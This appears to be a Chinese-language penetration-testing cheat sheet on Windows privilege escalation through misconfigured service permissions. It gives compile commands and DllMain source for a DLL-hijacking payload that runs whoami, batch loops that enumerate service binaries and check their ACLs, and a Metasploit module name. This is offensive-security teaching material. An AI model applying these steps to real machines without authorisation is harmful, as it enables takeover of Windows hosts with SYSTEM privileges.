# 错误的服务权限属性

主要利用方式：以管理员/SYSTEM 身份运行且文件权限不正确的服务进行利用，可以替换二进制文件，重新启动服务并获取系统。

## **DLL 劫持**

```bash
Find-PathDLLHijack PowerUp.ps1    找到缺失的dll文件

编译恶意dll：
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll   对于64位编译
i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll  对于32位编译

windows_dll.c 文件内容：
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

## 弱权限的路径目录

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

```bash
sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

**或者使用MSF的 exploit/windows/local/service_permissions 模块**

### **检查文件权限：**

cacls （Windows XP）

icacls (Windows Vista +)

**只需要关注**

`BUILTIN\Users:(F)`   (完全访问权限)

`BUILTIN\Users:(M)` （修改权限）

`BUILTIN\Users:(W)` （写入权限）